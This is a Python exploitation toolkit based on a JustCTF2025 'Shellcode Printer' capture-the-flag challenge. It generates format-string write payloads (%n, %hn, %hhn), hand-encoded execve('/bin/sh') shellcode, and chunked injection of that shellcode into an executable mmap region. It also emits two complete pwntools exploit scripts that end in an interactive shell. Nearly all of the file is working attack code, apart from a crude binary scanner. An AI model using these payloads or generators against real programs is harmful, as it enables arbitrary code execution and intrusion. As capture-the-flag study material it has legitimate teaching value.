#!/usr/bin/env python3

"""
Advanced Format String Exploitation Techniques
Based on JustCTF2025 Shellcode Printer challenge analysis
"""

import struct
import os
import sys
from pathlib import Path

class AdvancedFormatStringTechniques:
    """Advanced format string exploitation techniques"""
    
    def __init__(self):
        self.format_techniques = {
            "blind_write_primitive": self.blind_format_string_write,
            "incremental_shellcode": self.incremental_shellcode_injection,
            "mmap_rwx_exploitation": self.mmap_rwx_format_exploit,
            "fprintf_dev_null": self.fprintf_dev_null_technique
        }
        
        print("[+] Advanced Format String Techniques initialized")
    
    def detect_advanced_format_string(self, binary_path):
        """Detect advanced format string vulnerabilities"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            format_indicators = [
                b"fprintf", b"/dev/null", b"mmap", b"RWX",
                b"%n", b"%hn", b"%hhn", b"printf",
                b"format", b"string", b"shellcode"
            ]
            
            detected_indicators = []
            for indicator in format_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode('utf-8', errors='ignore'))
            
            if len(detected_indicators) >= 4:
                print(f"[+] Advanced format string challenge detected: {detected_indicators}")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Error detecting format string challenge: {e}")
            return False
    
    def blind_format_string_write(self, target_addr, value, offset=6):
        """
        Blind format string write primitive
        Works even when output goes to /dev/null
        """
        print(f"[+] Crafting blind format string write to 0x{target_addr:x}")
        
        # For 2-byte writes (short)
        if value <= 0xFFFF:
            payload = f"%{value}c%{offset}$hn"
            return payload.encode()
        
        # For 4-byte writes (int)
        elif value <= 0xFFFFFFFF:
            payload = f"%{value}c%{offset}$n"
            return payload.encode()
        
        # For 8-byte writes (split into two 4-byte writes)
        else:
            low = value & 0xFFFFFFFF
            high = (value >> 32) & 0xFFFFFFFF
            
            payloads = []
            payloads.append(f"%{low}c%{offset}$n")
            payloads.append(f"%{high}c%{offset+1}$n")
            
            return [p.encode() for p in payloads]
    
    def incremental_shellcode_injection(self, shellcode, chunk_size=2):
        """
        Incremental shellcode injection technique
        Writes shellcode in small chunks using format string
        """
        print(f"[+] Building incremental shellcode injection (chunk size: {chunk_size})")
        
        def split_shellcode(shellcode, chunk_size):
            """Split shellcode into chunks"""
            chunks = [shellcode[i:i+chunk_size] for i in range(0, len(shellcode), chunk_size)]
            words = []
            
            for chunk in chunks:
                if len(chunk) < chunk_size:
                    chunk += b'\x00' * (chunk_size - len(chunk))
                
                if chunk_size == 2:
                    val = struct.unpack('<H', chunk)[0]
                elif chunk_size == 4:
                    val = struct.unpack('<L', chunk)[0]
                else:
                    val = int.from_bytes(chunk, 'little')
                
                words.append(val)
            
            return words
        
        def build_format_payload(value, offset=6):
            """Build format string payload for value"""
            if chunk_size == 2:
                return f"%{value}c%{offset}$hn"
            elif chunk_size == 4:
                return f"%{value}c%{offset}$n"
            else:
                return f"%{value}c%{offset}$ln"
        
        # Generate shellcode if not provided
        if not shellcode:
            shellcode = self.generate_execve_shellcode()
        
        # Split shellcode into chunks
        chunks = split_shellcode(shellcode, chunk_size)
        
        # Build format string payloads
        payloads = []
        for i, chunk_value in enumerate(chunks):
            payload = build_format_payload(chunk_value)
            payloads.append(payload.encode())
            print(f"[+] Chunk {i+1}/{len(chunks)}: {payload}")
        
        # Add jump back to start (for circular execution)
        if chunk_size == 2:
            # jmp instruction (2 bytes): 0xebXX where XX is offset
            jump_offset = -(len(shellcode) + 2)  # Jump back to start
            jump_value = 0xeb00 | (jump_offset & 0xFF)
            jump_payload = build_format_payload(jump_value)
            payloads.append(jump_payload.encode())
            print(f"[+] Jump payload: {jump_payload}")
        
        return {
            "payloads": payloads,
            "chunk_count": len(chunks),
            "total_size": len(shellcode),
            "jump_payload": payloads[-1] if chunk_size == 2 else None
        }
    
    def mmap_rwx_format_exploit(self, mmap_ptr_offset=8):
        """
        Exploit mmap RWX region via format string
        Targets mmap pointer stored on stack
        """
        print(f"[+] Building mmap RWX format string exploit")
        
        exploit_template = f"""
#!/usr/bin/env python3
from pwn import *
import struct

context.arch = "amd64"
context.log_level = "info"

def split_shellcode(shellcode, chunk_size=2):
    chunks = [shellcode[i:i+chunk_size] for i in range(0, len(shellcode), chunk_size)]
    words = []
    for chunk in chunks:
        if len(chunk) < chunk_size:
            chunk += b'\\x00' * (chunk_size - len(chunk))
        val = struct.unpack('<H', chunk)[0]
        words.append(val)
    return words

def build_fmt_payload(value, offset=6):
    return f"%{{value}}c%{{offset}}$hn"

def generate_shellcode():
    return asm('''
        start:
            xor rax, rax
            push rax
            push rax
            pop rsi
            pop rdx
            mov rbx, 0x68732f6e69622f2f
            shr rbx, 8
            push rbx
            mov rdi, rsp
            mov al, 59
            syscall
            nop
            nop
            jmp start
    ''')

def exploit():
    io = process("./challenge")
    
    # Generate shellcode
    raw_shellcode = generate_shellcode()
    shellcode_to_send = raw_shellcode[:-3]  # Remove final jump
    splitted = split_shellcode(shellcode_to_send)
    
    # Send shellcode chunks
    for i, word in enumerate(splitted):
        fmt = build_fmt_payload(word, {mmap_ptr_offset // 8})
        log.info(f"Sending chunk {{i+1}}/{{len(splitted)}}: {{fmt}}")
        io.sendline(fmt.encode())
    
    # Final jump back to start
    io.sendline(b"%14674832c%{mmap_ptr_offset // 8}$n")
    
    # Null terminator to exit loop
    io.sendline(b"\\x00")
    
    io.interactive()

if __name__ == "__main__":
    exploit()
"""
        
        return exploit_template
    
    def fprintf_dev_null_technique(self):
        """
        Technique for exploiting fprintf to /dev/null
        Output is discarded but format string processing still occurs
        """
        print("[+] Building fprintf /dev/null exploitation technique")
        
        technique_info = {
            "description": "Exploit fprintf to /dev/null with format string",
            "key_insight": "Output discarded but %n writes still work",
            "requirements": [
                "Format string vulnerability in fprintf",
                "Target address on stack or known location",
                "Controlled format string input"
            ],
            "limitations": [
                "No output feedback for debugging",
                "Blind exploitation required",
                "Must know exact stack layout"
            ],
            "exploitation_steps": [
                "1. Identify fprintf call with user-controlled format string",
                "2. Locate target address (mmap pointer, return address, etc.)",
                "3. Calculate stack offset to target",
                "4. Use %n variants for blind writes",
                "5. Chain multiple writes for complex payloads"
            ]
        }
        
        # Example payloads for different scenarios
        example_payloads = {
            "write_small_value": "%100c%6$hhn",  # Write 100 to byte at offset 6
            "write_medium_value": "%1000c%6$hn", # Write 1000 to short at offset 6
            "write_large_value": "%50000c%6$n",  # Write 50000 to int at offset 6
            "chain_writes": [
                "%100c%6$hhn",   # First byte
                "%200c%7$hhn",   # Second byte
                "%300c%8$hhn",   # Third byte
                "%400c%9$hhn"    # Fourth byte
            ]
        }
        
        return {
            "technique_info": technique_info,
            "example_payloads": example_payloads
        }
    
    def generate_execve_shellcode(self):
        """Generate execve("/bin/sh") shellcode"""
        # x86_64 execve("/bin/sh") shellcode
        shellcode = b"\x48\x31\xc0"          # xor rax, rax
        shellcode += b"\x50"                 # push rax
        shellcode += b"\x50"                 # push rax
        shellcode += b"\x5e"                 # pop rsi
        shellcode += b"\x5a"                 # pop rdx
        shellcode += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rbx, "//bin/sh"
        shellcode += b"\x48\xc1\xeb\x08"    # shr rbx, 8
        shellcode += b"\x53"                 # push rbx
        shellcode += b"\x48\x89\xe7"        # mov rdi, rsp
        shellcode += b"\xb0\x3b"            # mov al, 59
        shellcode += b"\x0f\x05"            # syscall
        shellcode += b"\x90\x90"            # nop nop
        shellcode += b"\xeb\xf0"            # jmp start (relative jump back)
        
        return shellcode
    
    def analyze_format_string_vulnerability(self, binary_path):
        """Analyze format string vulnerability patterns"""
        print("[+] Analyzing format string vulnerability...")
        
        vulnerabilities = {
            "fprintf_dev_null": False,
            "mmap_rwx_region": False,
            "stack_pointer_leak": False,
            "incremental_write": False
        }
        
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            # Check for fprintf to /dev/null pattern
            if b"fprintf" in content and b"/dev/null" in content:
                vulnerabilities["fprintf_dev_null"] = True
                print("[+] fprintf to /dev/null pattern detected")
            
            # Check for mmap with RWX permissions
            if b"mmap" in content and (b"PROT_EXEC" in content or b"RWX" in content):
                vulnerabilities["mmap_rwx_region"] = True
                print("[+] mmap RWX region detected")
            
            # Check for format string patterns
            format_patterns = [b"%n", b"%hn", b"%hhn", b"printf", b"fprintf"]
            if any(pattern in content for pattern in format_patterns):
                vulnerabilities["stack_pointer_leak"] = True
                print("[+] Format string vulnerability patterns detected")
            
            # Check for incremental write patterns
            if b"loop" in content or b"while" in content:
                vulnerabilities["incremental_write"] = True
                print("[+] Potential incremental write capability detected")
            
        except Exception as e:
            print(f"[-] Error analyzing format string vulnerability: {e}")
        
        return vulnerabilities
    
    def get_format_string_strategy(self, vulnerabilities):
        """Get recommended format string exploitation strategy"""
        strategies = []
        
        if vulnerabilities.get("fprintf_dev_null") and vulnerabilities.get("mmap_rwx_region"):
            strategies.append({
                "technique": "Blind mmap RWX Shellcode Injection",
                "priority": "high",
                "description": "Use fprintf /dev/null with %n to write shellcode to mmap region",
                "method": "mmap_rwx_format_exploit"
            })
        
        if vulnerabilities.get("incremental_write"):
            strategies.append({
                "technique": "Incremental Shellcode Injection",
                "priority": "high",
                "description": "Write shellcode in small chunks using format string loop",
                "method": "incremental_shellcode_injection"
            })
        
        if vulnerabilities.get("stack_pointer_leak"):
            strategies.append({
                "technique": "Blind Write Primitive",
                "priority": "medium",
                "description": "Use format string for arbitrary memory writes",
                "method": "blind_format_string_write"
            })
        
        return strategies
    
    def generate_complete_format_exploit(self, target_binary="./challenge"):
        """Generate complete format string exploit"""
        print("[+] Generating complete format string exploit...")
        
        complete_exploit = f"""#!/usr/bin/env python3

'''
Advanced Format String Exploitation Script
Based on JustCTF2025 Shellcode Printer technique
Handles fprintf to /dev/null with incremental shellcode injection
'''

from pwn import *
import struct

context.arch = "amd64"
context.log_level = "info"

TARGET_BINARY = "{target_binary}"

def split_shellcode(shellcode, chunk_size=2):
    '''Split shellcode into chunks for incremental injection'''
    chunks = [shellcode[i:i+chunk_size] for i in range(0, len(shellcode), chunk_size)]
    words = []
    
    for chunk in chunks:
        if len(chunk) < chunk_size:
            chunk += b'\\x00' * (chunk_size - len(chunk))
        
        if chunk_size == 2:
            val = struct.unpack('<H', chunk)[0]
        elif chunk_size == 4:
            val = struct.unpack('<L', chunk)[0]
        else:
            val = int.from_bytes(chunk, 'little')
        
        words.append(val)
    
    return words

def build_format_payload(value, offset=6, write_size="short"):
    '''Build format string payload for specific value and write size'''
    if write_size == "byte":
        return f"%{{value}}c%{{offset}}$hhn"
    elif write_size == "short":
        return f"%{{value}}c%{{offset}}$hn"
    elif write_size == "int":
        return f"%{{value}}c%{{offset}}$n"
    else:
        return f"%{{value}}c%{{offset}}$ln"

def generate_execve_shellcode():
    '''Generate optimized execve("/bin/sh") shellcode'''
    return asm('''
        start:
            xor rax, rax
            push rax
            push rax
            pop rsi
            pop rdx
            mov rbx, 0x68732f6e69622f2f
            shr rbx, 8
            push rbx
            mov rdi, rsp
            mov al, 59
            syscall
            nop
            nop
            jmp start
    ''')

def exploit():
    '''Main exploitation function'''
    io = process(TARGET_BINARY)
    
    print("[+] Starting advanced format string exploitation...")
    
    # Generate shellcode
    raw_shellcode = generate_execve_shellcode()
    shellcode_to_send = raw_shellcode[:-3]  # Remove final jump for now
    
    # Split into 2-byte chunks
    chunks = split_shellcode(shellcode_to_send, 2)
    
    print(f"[+] Shellcode size: {{len(raw_shellcode)}} bytes")
    print(f"[+] Chunks to send: {{len(chunks)}}")
    
    # Send each chunk via format string
    for i, word in enumerate(chunks):
        fmt_payload = build_format_payload(word, 6, "short")
        log.info(f"Sending chunk {{i+1}}/{{len(chunks)}}: {{fmt_payload}}")
        io.sendline(fmt_payload.encode())
    
    # Add final jump back to start
    # This creates a loop so shellcode executes properly
    jump_payload = "%14674832c%6$n"  # Specific value for jump instruction
    log.info(f"Sending jump payload: {{jump_payload}}")
    io.sendline(jump_payload.encode())
    
    # Send null byte to terminate input loop
    io.sendline(b"\\x00")
    
    print("[+] Shellcode injection complete, attempting to get shell...")
    io.interactive()

def test_format_string():
    '''Test format string vulnerability detection'''
    io = process(TARGET_BINARY)
    
    # Test basic format string
    test_payloads = [
        b"%p %p %p %p",
        b"%6$p",
        b"%x %x %x %x",
        b"AAAA%6$p"
    ]
    
    for payload in test_payloads:
        print(f"[+] Testing payload: {{payload}}")
        io.sendline(payload)
        try:
            response = io.recvline(timeout=2)
            print(f"[+] Response: {{response}}")
        except:
            print("[-] No response or timeout")
    
    io.close()

def main():
    '''Main function with options'''
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_format_string()
    else:
        exploit()

if __name__ == "__main__":
    main()
"""
        
        return complete_exploit

def main():
    """Test advanced format string techniques"""
    print("Advanced Format String Exploitation Techniques Test")
    print("=" * 60)
    
    fmt_exploiter = AdvancedFormatStringTechniques()
    
    # Test detection
    test_binary = "test_format_challenge"
    if fmt_exploiter.detect_advanced_format_string(test_binary):
        print("[+] Advanced format string challenge detected")
        
        # Analyze vulnerabilities
        vulns = fmt_exploiter.analyze_format_string_vulnerability(test_binary)
        print(f"[+] Vulnerabilities found: {sum(vulns.values())}")
        
        # Get exploitation strategies
        strategies = fmt_exploiter.get_format_string_strategy(vulns)
        
        print("\n[+] Recommended exploitation strategies:")
        for i, strategy in enumerate(strategies, 1):
            print(f"{i}. {strategy['technique']} (Priority: {strategy['priority']})")
            print(f"   Description: {strategy['description']}")
        
        # Test incremental shellcode injection
        print("\n[+] Testing incremental shellcode injection...")
        shellcode = fmt_exploiter.generate_execve_shellcode()
        injection_result = fmt_exploiter.incremental_shellcode_injection(shellcode)
        print(f"[+] Generated {injection_result['chunk_count']} chunks for {injection_result['total_size']} byte shellcode")
        
        # Test blind write primitive
        print("\n[+] Testing blind write primitive...")
        write_payload = fmt_exploiter.blind_format_string_write(0x7fffffffe360, 0x4141)
        print(f"[+] Write payload: {write_payload}")
        
        # Generate complete exploit
        print("\n[+] Generating complete exploit...")
        complete_exploit = fmt_exploiter.generate_complete_format_exploit()
        print("[+] Complete exploit generated")
    
    else:
        print("[-] No advanced format string challenge detected")
    
    print("\n[+] Advanced format string techniques test completed!")

if __name__ == "__main__":
    main()